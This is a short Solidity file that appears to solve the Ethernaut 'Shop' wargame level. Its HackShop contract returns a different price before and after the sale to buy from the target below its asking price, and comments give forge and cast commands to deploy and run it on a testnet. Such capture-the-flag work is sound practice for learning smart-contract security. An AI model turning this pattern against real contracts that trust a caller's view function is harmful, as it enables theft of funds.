//SPDX-License-Identifier: UNLICENSED
// forge create HackShop --private-key $ETHERNAUGHT_PRIVATE_KEY --rpc-url $GORELI_OPTIMISIM_RPC --constructor-args "0x561C383E0ea6b6250D084C81b1635977B4d779Eb"
// cast send 0x7a497D79d719f779486147BBc58446c0B7a89Bf7 "exploit()" --private-key $ETHERNAUGHT_PRIVATE_KEY --rpc-url $GORELI_OPTIMISIM_RPC

pragma solidity 0.8.17;

import "./Shop.sol";

contract HackShop {
    Shop shop;

    constructor(Shop _address) {
        shop = _address;
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 101;
    }

    function exploit() public {
        shop.buy();
    }
}